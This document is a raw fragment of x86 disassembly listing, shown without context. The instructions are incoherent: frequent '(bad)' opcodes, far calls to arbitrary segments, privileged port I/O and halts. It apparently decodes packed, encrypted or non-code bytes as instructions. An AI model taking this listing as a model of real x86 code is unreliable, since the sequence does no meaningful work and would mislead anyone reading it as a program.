  419d6a:	mov    DWORD PTR [ebp-0x1c],edi
  419d6d:	mov    edi,DWORD PTR [ebp+0x8]
  419d70:	xor    edi,ecx
  419d72:	jmp    0x41c0fe
  419d77:	dec    ecx
  419d78:	mov    edi,0x37790f77
  419d7d:	imul   ebx,ecx,0x2d995a11
  419d83:	mov    bh,0xbd
  419d85:	mov    ds:0x7addf545,al
  419d8a:	jnp    0x419d74
  419d8c:	pushf  
  419d8d:	jnp    0x419e0a
  419d8f:	or     BYTE PTR [eax],bl
  419d91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d92:	and    ebx,ebp
  419d94:	call   0x67d:0x1dc7b02b
  419d9b:	retf   
  419d9c:	call   0x1306:0x72462a38
  419da3:	inc    ebx
  419da4:	call   0xfe0f81d2
  419da9:	inc    ebx
  419daa:	popf   
  419dab:	jg     0x419dac
  419dad:	pop    esi
  419dae:	adc    DWORD PTR [edx],0xc4ae0b8a
  419db4:	xor    ebx,DWORD PTR [edi-0x72e69ff]
  419dba:	inc    ebp
  419dbb:	rol    BYTE PTR [eax-0x46],1
  419dbe:	sbb    eax,0xf68fd487
  419dc3:	shl    DWORD PTR [ecx+0x49],cl
  419dc6:	stos   DWORD PTR es:[edi],eax
  419dc7:	xchg   esp,esp
  419dc9:	cmc    
  419dca:	sbb    ebp,DWORD PTR [edi-0x4a]
  419dcd:	ss sbb eax,0xdd794249
  419dd3:	xor    eax,DWORD PTR [edi+edi*2+0x7b3ff8bb]
  419dda:	dec    ecx
  419ddb:	ja     0x419e10
  419ddd:	mov    ebp,0xceb0e966
  419de2:	ja     0x419de8
  419de4:	push   es
  419de5:	adc    esp,ebx
  419de7:	test   al,0xf0
  419de9:	hlt    
  419dea:	repnz outs dx,DWORD PTR ds:[esi]
  419dec:	add    bl,BYTE PTR [edx]
  419dee:	fs mov ebx,0xdeb0215a
  419df4:	push   0x89f0d0e0
  419df9:	test   eax,0x55df7501
  419dfe:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  419e00:	push   esi
  419e01:	adc    DWORD PTR [esp+ecx*1+0x9c13fca],ecx
  419e08:	stos   BYTE PTR es:[edi],al
  419e09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e0a:	jbe    0x419e6f
  419e0c:	sbb    al,BYTE PTR [edx]
  419e0e:	dec    edx
  419e0f:	into   
  419e10:	loopne 0x419e0e
  419e12:	mov    fs,WORD PTR [edi+0x3e]
  419e15:	xor    al,0x9b
  419e17:	rcr    ah,0xbe
  419e1a:	or     dl,al
  419e1c:	push   0xaf4951b4
  419e21:	ins    DWORD PTR es:[edi],dx
  419e22:	je     0x419e3d
  419e24:	test   al,0x32
  419e26:	or     BYTE PTR [eax+0x45],ch
  419e29:	cmp    BYTE PTR [ebx],al
  419e2b:	or     DWORD PTR [eax+0x16],esi
  419e2e:	lahf   
  419e2f:	xchg   edi,esi
  419e31:	push   ebx
  419e32:	imul   edi,DWORD PTR [ecx],0xfffffff4
  419e35:	aad    0xa1
  419e37:	adc    DWORD PTR [ebp-0x45],edi
  419e3a:	or     DWORD PTR [edx-0x2f5c767a],0xf
  419e41:	jns    0x419eac
  419e43:	jmp    0xc020:0xb2df453a
  419e4a:	push   ebp
  419e4b:	jno    0x419e5e
  419e4d:	imul   ecx,DWORD PTR [ecx],0x22
  419e50:	cmp    eax,0x277e9859
  419e55:	daa    
  419e56:	push   esp
  419e57:	sbb    ecx,edx
  419e59:	cdq    
  419e5a:	cmp    ecx,ebp
  419e5c:	mov    ch,0xab
  419e5e:	mov    dl,0xe
  419e60:	mov    dl,0x67
  419e62:	pop    DWORD PTR [ecx+ebx*8+0x46f6c5a2]
  419e69:	addr16 call 0x7d8d:0x266bbd1a
  419e71:	mov    bh,0xcd
  419e73:	in     eax,0xf3
  419e75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e77:	jo     0x419e41
  419e79:	or     eax,0xd5e2fbe8
  419e7e:	push   ecx
  419e7f:	lea    ebx,[ecx-0x2a]
  419e82:	ret    
  419e83:	jne    0x419e66
  419e85:	mov    esi,0x5d70439c
  419e8a:	adc    al,0xc9
  419e8c:	test   al,0x7a
  419e8e:	jmp    0x419e80
  419e90:	pop    edi
  419e91:	sub    BYTE PTR [eax-0xb74ed2e],bl
  419e97:	enter  0x81e8,0xc9
  419e9b:	xchg   BYTE PTR [ebp-0x43],al
  419e9e:	(bad)  
  419e9f:	fld    QWORD PTR [edi+esi*8-0x739f3259]
  419ea6:	imul   ebx,DWORD PTR [ecx+0x48],0xffffff93
  419eaa:	push   0xfffffffc
  419eac:	test   al,0x46
  419eae:	in     eax,dx
  419eaf:	mov    cs,WORD PTR [eax+edi*8]
  419eb2:	mov    BYTE PTR [edi],bl
  419eb4:	or     edx,0xc0363c70
  419eba:	mov    ebp,0x8df3c369
  419ebf:	dec    eax
  419ec0:	jle    0x419e7a
  419ec2:	pushf  
  419ec3:	push   esp
  419ec4:	and    eax,0xe747b7bd
  419ec9:	aaa    
  419eca:	xor    al,0x54
  419ecc:	lock push edi
  419ece:	jbe    0x419e6a
  419ed0:	in     al,dx
  419ed1:	mov    al,ds:0xfddc23ca
  419ed6:	xchg   esp,eax
  419ed7:	jns    0x419e93
  419ed9:	push   eax
  419eda:	xchg   ebx,eax
  419edb:	popa   
  419edc:	lods   eax,DWORD PTR ds:[esi]
  419edd:	loop   0x419f08
  419edf:	adc    al,0x79
  419ee1:	pop    ecx
  419ee2:	lea    ebp,[edx+0x6b0811de]
  419ee8:	lahf   
  419ee9:	push   es
  419eea:	in     eax,0xd6
  419eec:	sub    BYTE PTR [ecx+0x7d9909aa],bh
  419ef2:	(bad)  
  419ef3:	and    ebx,DWORD PTR [edx]
  419ef5:	adc    al,bh
  419ef7:	jg     0x419f15
  419ef9:	mov    dl,0x8a
  419efb:	jmp    0x419ef7
  419efd:	pushf  
  419efe:	fnstenv [ebx+ecx*8]
  419f01:	xor    al,0x2e
  419f03:	jmp    0x419ea5
  419f05:	pusha  
  419f06:	fwait
  419f07:	cdq    
  419f08:	out    dx,al
  419f09:	inc    ebp
  419f0a:	xchg   edi,eax
  419f0b:	mov    cl,0xf9
  419f0d:	mov    esi,0xae79675a
  419f12:	adc    eax,0x1340a6b6
  419f17:	jno    0x419f44
  419f19:	dec    esp
  419f1a:	dec    esp
  419f1b:	jno    0x419f35
  419f1d:	cmc    
  419f1e:	mov    esp,0x4c04c343
  419f23:	add    eax,edi
  419f25:	and    al,0xd5
  419f27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f29:	push   ebx
  419f2a:	cmp    BYTE PTR [edi],cl
  419f2c:	push   ebp
  419f2d:	repz fcmovne st,st(4)
  419f30:	add    edx,ebx
  419f32:	div    BYTE PTR [edx]
  419f34:	pop    edi
  419f35:	cmp    al,0x6b
  419f37:	add    eax,0x9e3c96c2
  419f3c:	data16 jno 0x419eda
  419f3f:	fdiv   st(2),st
  419f41:	ror    ch,0xe2
  419f44:	jl     0x419f80
  419f46:	jno    0x419f38
  419f48:	xor    DWORD PTR [ecx],esi
  419f4a:	xchg   ecx,eax
  419f4b:	cmc    
  419f4c:	lods   eax,DWORD PTR ds:[esi]
  419f4d:	sub    BYTE PTR [ebx],ah
  419f4f:	xor    al,0xd8
  419f51:	cmp    al,0xe6
  419f53:	out    dx,al
  419f54:	xchg   edi,eax
  419f55:	out    0x55,al
  419f57:	aas    
  419f58:	pop    ds
  419f59:	xor    eax,0xfce2b69b
  419f5e:	fsqrt  
  419f60:	in     al,dx
  419f61:	in     eax,0x58
  419f63:	retf   
  419f64:	push   esp
  419f65:	fstp   DWORD PTR [esi-0x5d822e93]
  419f6b:	xor    ecx,DWORD PTR [ebp-0x3b]
  419f6e:	jmp    0xbee63d80
  419f73:	dec    edx
  419f74:	jo     0x419f09
  419f76:	stc    
  419f77:	das    
  419f78:	mov    ah,BYTE PTR [esp]
  419f7b:	jns    0x419f7b
  419f7d:	hlt    
  419f7e:	ret    
  419f7f:	xor    BYTE PTR [edx+0x2e],ah
  419f82:	dec    ebx
  419f83:	mov    ebp,DWORD PTR [edx]
  419f85:	xor    eax,DWORD PTR [eax]
  419f87:	add    BYTE PTR [ebp+0x3ea8bc09],0x31
  419f8e:	iret   
  419f8f:	pop    ds
  419f90:	push   ecx
  419f91:	lock stos DWORD PTR es:[edi],eax
  419f93:	jmp    0x3daad773
  419f98:	inc    edi
  419f99:	pop    esp
  419f9a:	lock xor DWORD PTR [ecx+0x288f675],ebp
  419fa1:	fbld   TBYTE PTR [ecx+0x1c]
  419fa4:	pop    edi
  419fa5:	jne    0x419fed
  419fa7:	(bad)  
  419fa8:	sbb    dh,BYTE PTR [eax+edx*1]
  419fab:	mov    bl,0x9d
  419fad:	dec    eax
  419fae:	addr16 dec esi
  419fb0:	fld    TBYTE PTR [ebp+0x7219659d]
  419fb6:	das    
  419fb7:	leave  
  419fb8:	push   ebx
  419fb9:	sub    BYTE PTR [edx-0x512b8040],bh
  419fbf:	cmp    al,0x91
  419fc1:	mov    eax,DWORD PTR [ecx+eax*2+0x3439470a]
  419fc8:	adc    eax,0xa3b2f740
  419fcd:	imul   edx,DWORD PTR [ebp+0x619237d0],0xffffffda
  419fd4:	jne    0x41a053
  419fd6:	mov    ebx,0xdfc5dbab
  419fdb:	je     0x41a03e
  419fdd:	adc    dl,BYTE PTR [esi-0x2e958196]
  419fe3:	xchg   esi,eax
  419fe4:	jns    0x419f7d
  419fe6:	add    esi,DWORD PTR [ecx+0x47]
  419fe9:	mov    ebp,0x3076a355
  419fee:	and    al,BYTE PTR [ecx+0x4b]
  419ff1:	sbb    eax,0x2c866ce4
  419ff6:	sub    al,0x91
  419ff8:	cmp    dh,BYTE PTR [esi+0xa9ea885]
  419ffe:	inc    esi
  419fff:	mov    esi,0xef0d8782
  41a004:	dec    esi
  41a005:	sbb    edi,DWORD PTR [ecx+0x6e7f7f8e]
  41a00b:	sbb    eax,0x4a4e6d87
  41a010:	mov    dl,0xb7
  41a012:	jl     0x419fe5
  41a014:	sbb    eax,0x547ebd27
  41a019:	add    al,0x5d
  41a01b:	dec    esi
  41a01c:	fidiv  WORD PTR [ecx-0x762ef348]
  41a022:	cmp    BYTE PTR [esi+0x4590994d],al
  41a028:	xchg   esi,eax
  41a029:	call   0xbc18:0xe2eb43b6
  41a030:	aad    0x52
  41a032:	sub    eax,ebp
  41a034:	sbb    BYTE PTR [eax+0x91afe8a],dh
  41a03a:	addr16 cli 
  41a03c:	mov    edi,0x4cd2855c
  41a041:	push   ds
  41a042:	or     ebp,edi
  41a044:	xchg   esp,eax
  41a045:	pushf  
  41a046:	(bad)
  41a049:	out    0xe6,al
  41a04b:	mov    edx,0x5bfcf3
  41a050:	cmp    eax,0xb732077
  41a055:	or     eax,DWORD PTR [ebx-0x3]
  41a058:	pop    esp
  41a059:	mov    bh,0xf2
  41a05b:	or     BYTE PTR [edx-0x53d65ee4],al
  41a061:	rcl    BYTE PTR [ebp+0x65],cl
  41a064:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a065:	mov    esp,0x2447a84d
  41a06a:	sbb    eax,0xfa1d5106
  41a06f:	sub    eax,0xb0c6655b
  41a074:	mov    edi,0x69801524
  41a079:	loopne 0x41a07e
  41a07b:	jg     0x41a000
  41a07d:	jmp    0x41a0a5
  41a07f:	inc    ecx
  41a080:	call   0xe8b1:0x23bb2d3e
  41a087:	lahf   
  41a088:	out    0x9d,al
  41a08a:	ja     0x41a0a2
  41a08c:	sub    dl,0x43
  41a08f:	ds js  0x41a047
  41a092:	mov    ch,0x0
  41a094:	dec    BYTE PTR [edx-0x5]
  41a097:	test   al,0xe
  41a099:	(bad)  
  41a09a:	sbb    edx,DWORD PTR [ebp-0x2f]
  41a09d:	int    0x6
  41a09f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0a0:	fsubr  QWORD PTR [edx-0x30]
  41a0a3:	and    al,0xe8
  41a0a5:	inc    edi
  41a0a6:	or     dh,0xe3
  41a0a9:	mov    cl,0x7b
  41a0ab:	sub    eax,0xc7c50365
  41a0b0:	out    0xf0,al
  41a0b2:	adc    al,0x4a
  41a0b4:	rcpps  xmm6,xmm6
  41a0b7:	repnz pop esp
  41a0b9:	icebp  
  41a0ba:	lock mov al,0xfd
  41a0bd:	mov    ebx,0x31fa2fc0
  41a0c2:	adc    DWORD PTR [ebp-0x10],ebp
  41a0c5:	push   ss
  41a0c6:	mov    bh,0xaa
  41a0c8:	pusha  
  41a0c9:	and    BYTE PTR [edx],dl
  41a0cb:	adc    eax,DWORD PTR [edx+0x5f]
  41a0ce:	in     al,0xca
  41a0d0:	and    BYTE PTR [eax],0x82
  41a0d3:	retf   0xb1e1
  41a0d6:	iret   
  41a0d7:	jge    0x41a0dc
  41a0d9:	rep ins BYTE PTR es:[edi],dx
  41a0db:	adc    eax,0xe8f0deed
  41a0e0:	ds inc esi
  41a0e2:	adc    DWORD PTR [ecx],ecx
  41a0e4:	push   ebp
  41a0e5:	jmp    0x41a165
  41a0e7:	mov    WORD PTR ss:[esi+0x60],es
  41a0eb:	cmp    al,bl
  41a0ed:	cmp    ecx,DWORD PTR [edi+0x1b2d4583]
  41a0f3:	test   al,0xe2
  41a0f5:	mov    cs:0xf8feea46,eax
  41a0fb:	out    0x59,eax
  41a0fd:	mov    eax,0xb8798dd9
  41a102:	push   0x80ea0fd7
  41a107:	rcr    BYTE PTR [edi+0x5f],0x74
  41a10b:	pop    eax
  41a10c:	les    esp,FWORD PTR [eax+esi*1-0x66cfb174]
  41a113:	pushf  
  41a114:	int3   
  41a115:	sub    bh,BYTE PTR [edx+eiz*1+0x50]
  41a119:	(bad)  
  41a11a:	pop    edi
  41a11b:	push   edx
  41a11c:	sbb    eax,DWORD PTR [esi+ebx*4+0x47655b2f]
  41a123:	sar    BYTE PTR [esi-0x70888f75],cl
  41a129:	pop    edx
  41a12a:	ss out 0xa0,eax
  41a12d:	cs aad 0x8c
  41a130:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a131:	sbb    ch,BYTE PTR [edi]
  41a133:	in     eax,dx
  41a134:	pop    ds
  41a135:	in     al,0x4d
  41a137:	aad    0x7
  41a139:	or     eax,0x64688bcd
  41a13e:	dec    ecx
  41a13f:	pop    esi
  41a140:	xchg   BYTE PTR [edx-0x22],bl
  41a143:	aam    0xc1
  41a145:	scas   eax,DWORD PTR es:[edi]
  41a146:	xchg   DWORD PTR [eax+0x3d99f67],ecx
  41a14c:	push   eax
  41a14d:	inc    esi
  41a14e:	iret   
  41a14f:	bnd jg 0x41a13e
  41a152:	mov    ch,BYTE PTR [ebx-0x11]
  41a155:	in     eax,0x9e
  41a157:	fs aam 0x4d
  41a15a:	sbb    dh,BYTE PTR [edx-0x28]
  41a15d:	ja     0x41a1cf
  41a15f:	retf   0xfc16
  41a162:	push   ebp
  41a163:	push   ss
  41a164:	jns    0x41a1c0
  41a166:	inc    esi
  41a167:	in     al,dx
  41a168:	dec    edi
  41a169:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a16a:	or     al,0x6e
  41a16c:	cmp    al,0xa5
  41a16e:	inc    esp
  41a16f:	sub    edi,DWORD PTR [edi]
  41a171:	test   al,0x70
  41a173:	fldcw  WORD PTR [edi-0x6ec42a8c]
  41a179:	adc    bl,BYTE PTR [ecx*4-0x1a3be965]
  41a180:	mov    esi,0x867dacc6
  41a185:	and    ch,bl
  41a187:	imul   ebp,DWORD PTR [edi],0x30cf83a
  41a18d:	add    dh,dl
  41a18f:	adc    DWORD PTR [eax-0x4],edi
  41a192:	cmp    eax,0xa5332850
  41a197:	les    ebp,FWORD PTR [ecx-0x5f3b7bbc]
  41a19d:	push   ecx
  41a19e:	add    dl,BYTE PTR [esi]
  41a1a0:	popa   
  41a1a1:	inc    ebx
  41a1a2:	pop    ds
  41a1a3:	pop    ds
  41a1a4:	pop    esp
  41a1a5:	cmp    ah,dl
  41a1a7:	fisttp QWORD PTR [ecx-0x5d2d0a4b]
  41a1ad:	cmp    eax,0xbf6a4fdc
  41a1b2:	into   
  41a1b3:	pop    ds
  41a1b4:	dec    edx
  41a1b5:	jle    0x41a185
  41a1b7:	pop    esp
  41a1b8:	cdq    
  41a1b9:	jbe    0x41a1be
  41a1bb:	sub    edi,DWORD PTR es:[eax]
  41a1be:	sub    BYTE PTR [esi-0x216424e1],al
  41a1c4:	jp     0x41a191
  41a1c6:	jne    0x41a245
  41a1c8:	jp     0x41a1b3
  41a1ca:	xchg   edi,eax
  41a1cb:	fwait
  41a1cc:	pop    esi
  41a1cd:	scas   al,BYTE PTR es:[edi]
  41a1ce:	fiadd  DWORD PTR [eax+0x7b]
  41a1d1:	sti    
  41a1d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1d3:	and    eax,0xdc2f4ddc
  41a1d8:	jbe    0x41a1c7
  41a1da:	push   cs
  41a1db:	or     eax,0xc1c6bc4e
  41a1e0:	dec    eax
  41a1e1:	add    DWORD PTR [eax-0x1426e753],edx
  41a1e7:	sub    DWORD PTR [eax+0x5f1ed5b4],eax
  41a1ed:	push   edx
  41a1ee:	xchg   ebx,eax
  41a1ef:	pop    ebx
  41a1f0:	(bad)  
  41a1f2:	fadd   st,st(4)
  41a1f4:	pop    ss
  41a1f5:	hlt    
  41a1f6:	sti    
  41a1f7:	push   0x24b3e8f9
  41a1fc:	mov    al,ds:0xb264fdf9
  41a201:	or     al,ch
  41a203:	int    0xab
  41a205:	push   es
  41a206:	cmp    bh,BYTE PTR [ecx]
  41a208:	in     al,0xc9
  41a20a:	ret    0x9a18
  41a20d:	shl    BYTE PTR [esi],cl
  41a20f:	outs   dx,BYTE PTR ds:[esi]
  41a210:	cmp    dh,BYTE PTR ds:[ecx+0x421a78f]
  41a217:	xor    BYTE PTR ds:0xdbd73a9e,ah
  41a21d:	sti    
  41a21e:	xchg   ecx,eax
  41a21f:	cmp    DWORD PTR [ecx+0x71a77f71],ebx
  41a225:	aad    0xd0
  41a227:	dec    edi
  41a228:	enter  0xcd05,0xc6
  41a22c:	push   ebp
  41a22d:	lahf   
  41a22e:	mov    ebp,0xae13c97f
  41a233:	mov    esi,0x6c8d6ca7
  41a238:	adc    al,0x1b
  41a23a:	xchg   ebx,eax
  41a23b:	mov    dl,0xdd
  41a23d:	xlat   BYTE PTR ds:[ebx]
  41a23e:	ror    BYTE PTR [edi],1
  41a240:	arpl   si,cx
  41a242:	retf   0xd63
  41a245:	push   ebx
  41a246:	fist   WORD PTR [eax+0x4]
  41a249:	mov    ah,0x97
  41a24b:	fsub   QWORD PTR [ecx-0x5b]
  41a24e:	jns    0x41a1e8
  41a250:	sbb    al,0xd8
  41a252:	std    
  41a253:	arpl   WORD PTR [ecx-0x2ca3a940],dx
  41a259:	das    
  41a25a:	sub    BYTE PTR [edi-0x31c13616],ah
  41a260:	and    edi,DWORD PTR [eax]
  41a262:	sbb    dl,BYTE PTR [esi]
  41a264:	add    ebp,DWORD PTR [esi-0x4c]
  41a267:	xchg   esp,eax
  41a268:	inc    edi
  41a269:	dec    edx
  41a26a:	std    
  41a26b:	push   0xffffff8a
  41a26d:	les    esi,FWORD PTR [eax+0x773b7da]
  41a273:	pop    ebp
  41a274:	jno    0x41a2ed
  41a276:	(bad)  [ecx+0x1]
  41a279:	stos   BYTE PTR es:[edi],al
  41a27a:	inc    esi
  41a27b:	in     al,dx
  41a27c:	xchg   BYTE PTR [edi-0x15],bl
  41a27f:	ret    
  41a280:	loope  0x41a249
  41a282:	sub    eax,0xb8266179
  41a287:	(bad)  
  41a288:	push   ecx
  41a289:	aam    0xbd
  41a28b:	push   eax
  41a28c:	push   ebp
  41a28d:	xor    bh,BYTE PTR [eax]
  41a28f:	xchg   DWORD PTR [edi],edi
  41a291:	ret    
  41a292:	add    dl,dl
  41a294:	push   ds
  41a295:	mov    eax,0x7859695
  41a29a:	mov    al,bh
  41a29c:	pop    ss
  41a29d:	aad    0x6
  41a29f:	je     0x41a237
  41a2a1:	push   edx
  41a2a2:	ins    BYTE PTR es:[edi],dx
  41a2a3:	shl    ebx,cl
  41a2a5:	sbb    ah,BYTE PTR [esi+eax*8-0x26]
  41a2a9:	in     eax,dx
  41a2aa:	ret    
  41a2ab:	dec    ebp
  41a2ac:	xchg   ecx,eax
  41a2ad:	fadd   DWORD PTR [eax]
  41a2af:	pop    eax
  41a2b0:	push   edi
  41a2b1:	pop    esi
  41a2b2:	sbb    DWORD PTR [ebx+0x67],esi
  41a2b5:	mov    gs,WORD PTR [edx-0x5c492ad6]
  41a2bb:	test   BYTE PTR [ebx-0x22880a74],al
  41a2c1:	inc    esi
  41a2c2:	jmp    0xabeb53a5
  41a2c7:	cmp    edx,edx
  41a2c9:	pusha  
  41a2ca:	inc    ebx
  41a2cb:	jns    0x41a2c8
  41a2cd:	pusha  
  41a2ce:	(bad)  
  41a2cf:	outs   dx,BYTE PTR ds:[esi]
  41a2d0:	es std 
  41a2d2:	not    ecx
  41a2d4:	ficom  WORD PTR [ecx-0x5fbf8170]
  41a2da:	dec    esi
  41a2db:	aad    0x12
  41a2dd:	xchg   edx,eax
  41a2de:	jge    0x41a306
  41a2e0:	pop    ebp
  41a2e1:	fnstcw WORD PTR [edx+0x27d83227]
  41a2e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2e9:	mov    eax,0x2fecb1cb
  41a2ee:	bound  edx,QWORD PTR [edi+ebp*1-0x4389e9ea]
  41a2f5:	int3   
  41a2f6:	scas   al,BYTE PTR es:[edi]
  41a2f7:	jns    0x41a314
  41a2f9:	and    al,0x5d
  41a2fb:	jo     0x41a31e
  41a2fd:	fs push ecx
  41a2ff:	aaa    
  41a300:	imul   bh
  41a302:	sbb    al,0xf3
  41a304:	mov    ebx,0x38e06cf3
  41a309:	fcmovu st,st(7)
  41a30b:	sbb    DWORD PTR [edi*1+0x6d28a3c],ecx
  41a312:	or     dh,bh
  41a314:	aad    0x1e
  41a316:	(bad)  
  41a317:	push   ds
  41a318:	and    BYTE PTR [edi+0x23de2b0b],bl
  41a31e:	sbb    BYTE PTR [edi-0x7d],bh
  41a321:	pop    esp
  41a322:	rol    BYTE PTR [esi-0x1fb8fcb],1
  41a328:	sti    
  41a329:	jmp    0x2c5e6f97
  41a32e:	(bad)  
  41a32f:	in     al,0xc3
  41a331:	adc    al,0xf3
  41a333:	mov    ch,BYTE PTR [eax-0x6fd776e]
  41a339:	add    al,0x8a
  41a33b:	call   0xfa4d:0xb015e29a
  41a342:	cmp    al,0x2a
  41a344:	push   edi
  41a345:	ins    BYTE PTR es:[edi],dx
  41a346:	xchg   DWORD PTR [edi+0x2f319310],ebx
  41a34c:	push   esi
  41a34d:	adc    ecx,DWORD PTR fs:[ebx]
  41a350:	add    eax,0xc54ddd0a
  41a355:	cwde   
  41a356:	leave  
  41a357:	mov    DWORD PTR [eax+edx*4],edi
  41a35a:	pop    ss
  41a35b:	cwde   
  41a35c:	pushf  
  41a35d:	inc    ebp
  41a35e:	push   0x8b695215
  41a363:	pusha  
  41a364:	lahf   
  41a365:	mov    bh,0x5b
  41a367:	xchg   esi,eax
  41a368:	dec    ebp
  41a369:	push   edx
  41a36a:	mov    ch,0x70
  41a36c:	rcl    DWORD PTR [edi],cl
  41a36e:	add    al,0xb1
  41a370:	mov    ebx,0x96f46e80
  41a375:	push   ebx
  41a376:	jmp    FWORD PTR [eax+eiz*8+0x74]
  41a37a:	jbe    0x41a381
  41a37c:	mov    ds:0x5759a627,al
  41a381:	out    0x62,eax
  41a383:	enter  0x4d82,0xbb
  41a387:	js     0x41a3d8
  41a389:	push   ecx
  41a38a:	(bad)  
  41a38b:	outs   dx,BYTE PTR ds:[esi]
  41a38c:	add    DWORD PTR [ebx-0x4f],eax
  41a38f:	and    ah,BYTE PTR [ebx]
  41a391:	mov    ecx,0xade9ff8e
  41a396:	xor    eax,0xebca07d7
  41a39b:	repz fcomp DWORD PTR [ebx]
  41a39e:	pop    ecx
  41a39f:	sbb    ebp,DWORD PTR [edi]
  41a3a1:	sbb    BYTE PTR [esp+ebp*8+0x71],0x4d
  41a3a6:	adc    DWORD PTR [esp+ecx*4+0x65],esp
  41a3aa:	jb     0x41a400
  41a3ac:	cmp    ecx,DWORD PTR [ecx-0x7a19551e]
  41a3b2:	in     al,0xb1
  41a3b4:	ins    BYTE PTR es:[edi],dx
  41a3b5:	in     al,dx
  41a3b6:	cmp    BYTE PTR [edx+0x78],bh
  41a3b9:	iret   
  41a3ba:	clc    
  41a3bb:	or     DWORD PTR [edi-0x74],0x854933f9
  41a3c2:	xchg   edi,eax
  41a3c3:	mov    ds:0x7ed844d2,al
  41a3c8:	popa   
  41a3c9:	mov    ebx,0xcdeff574
  41a3ce:	xor    al,0x30
  41a3d0:	and    ch,dl
  41a3d2:	adc    eax,0x35231633
  41a3d7:	xor    DWORD PTR [eax+0x50],ebx
  41a3da:	pop    ss
  41a3db:	jmp    0x2ca8:0x63bb6483
  41a3e2:	inc    edi
  41a3e3:	lods   eax,DWORD PTR ds:[esi]
  41a3e4:	test   DWORD PTR [ebx],ebp
  41a3e6:	or     DWORD PTR [ebx-0x73],esp
  41a3e9:	fst    DWORD PTR [edx]
  41a3eb:	mov    bl,0x89
  41a3ed:	add    DWORD PTR [ebx-0x5d9818ca],edi
  41a3f3:	out    dx,al
  41a3f4:	xchg   edi,eax
  41a3f5:	mov    dh,0xcc
  41a3f7:	and    ch,dh
  41a3f9:	outs   dx,DWORD PTR ds:[esi]
  41a3fa:	sub    BYTE PTR [edi+edi*4],ch
  41a3fd:	stos   BYTE PTR es:[edi],al
  41a3fe:	mov    ebp,0xce51ac11
  41a403:	shr    edi,1
  41a405:	adc    al,0xc0
  41a407:	(bad)  
  41a408:	mov    DWORD PTR ds:0xa5b8dc36,edx
  41a40e:	jb     0x41a40b
  41a410:	xchg   BYTE PTR [edi],bh
  41a412:	sbb    esi,esp
  41a414:	dec    ecx
  41a415:	xchg   edi,eax
  41a416:	mov    ebp,DWORD PTR [esi+0x2b]
  41a419:	mov    eax,ds:0xb9cd9a39
  41a41e:	add    DWORD PTR [edi],esp
  41a420:	jg     0x41a444
  41a422:	imul   eax,DWORD PTR [edi+0x64],0x2f02d8d6
  41a429:	and    ecx,0xffffff91
  41a42c:	fxch   st(0)
  41a42e:	add    eax,0x2058540
  41a433:	xchg   BYTE PTR [edx-0x19909925],bl
  41a439:	out    0x9f,al
  41a43b:	clc    
  41a43c:	or     edx,0x69
  41a43f:	mov    edi,0xf4584321
  41a444:	xor    dh,BYTE PTR [ebp+eax*1-0x5e859865]
  41a44b:	ins    BYTE PTR es:[edi],dx
  41a44c:	inc    edx
  41a44d:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a44f:	test   dh,al
  41a451:	arpl   WORD PTR [ebx+0x65944f10],di
  41a457:	mov    bl,0x33
  41a459:	inc    edx
  41a45a:	pushf  
  41a45b:	push   es
  41a45c:	xor    DWORD PTR [edi-0x38],0xd2fa451b
  41a463:	imul   edx,DWORD PTR [ebx-0x65515fe2],0x27cdd4d8
  41a46d:	mov    eax,ds:0x1466c2ea
  41a472:	sahf   
  41a473:	das    
  41a474:	iret   
  41a475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a476:	std    
  41a477:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a478:	xlat   BYTE PTR ds:[ebx]
  41a479:	jbe    0x41a4c9
  41a47b:	or     DWORD PTR [ebp-0xf95b6cf],0xc5354bfc
  41a485:	and    ch,al
  41a487:	add    eax,0xfc7b0d0f
  41a48c:	in     eax,dx
  41a48d:	pop    ecx
  41a48e:	inc    ebx
  41a48f:	(bad)  [ecx+0x2f]
  41a492:	pop    eax
  41a493:	sbb    al,0x58
  41a495:	xchg   ebx,eax
  41a496:	es pop edx
  41a498:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a499:	dec    ecx
  41a49a:	pop    edi
  41a49b:	sbb    DWORD PTR [esi+esi*8+0x73],edi
  41a49f:	pop    eax
  41a4a0:	daa    
  41a4a1:	aaa    
  41a4a2:	add    eax,0x7eb6b819
  41a4a7:	mov    ecx,0x42f76c23
  41a4ac:	dec    esp
  41a4ad:	sub    eax,0xcb350a40
  41a4b2:	and    ecx,DWORD PTR [eax+0x260ea3c5]
  41a4b8:	sub    dh,BYTE PTR [edi-0x7b]
  41a4bb:	push   ebp
  41a4bc:	push   cs
  41a4bd:	sti    
  41a4be:	jo     0x41a519
  41a4c0:	jo     0x41a475
  41a4c2:	mov    bl,0xca
  41a4c4:	jmp    0x1b43:0x9a2b988a
  41a4cb:	xor    BYTE PTR [edx-0x4e32698],bl
  41a4d1:	into   
  41a4d2:	in     eax,0xec
  41a4d4:	pop    ss
  41a4d5:	and    al,0x41
  41a4d7:	dec    esp
  41a4d8:	push   es
  41a4d9:	xchg   ebx,eax
  41a4da:	push   0xc3539749
  41a4df:	popf   
  41a4e0:	push   0x6006eaa
  41a4e5:	mov    ah,dl
  41a4e7:	xor    al,0x2b
  41a4e9:	pop    es
  41a4ea:	xchg   esi,eax
  41a4eb:	ffree  st(6)
  41a4ed:	neg    BYTE PTR [esi+0x4b]
  41a4f0:	(bad)  
  41a4f1:	mov    ecx,?
  41a4f3:	dec    eax
  41a4f4:	inc    ecx
  41a4f5:	jge    0x41a4eb
  41a4f7:	das    
  41a4f8:	xchg   ebx,eax
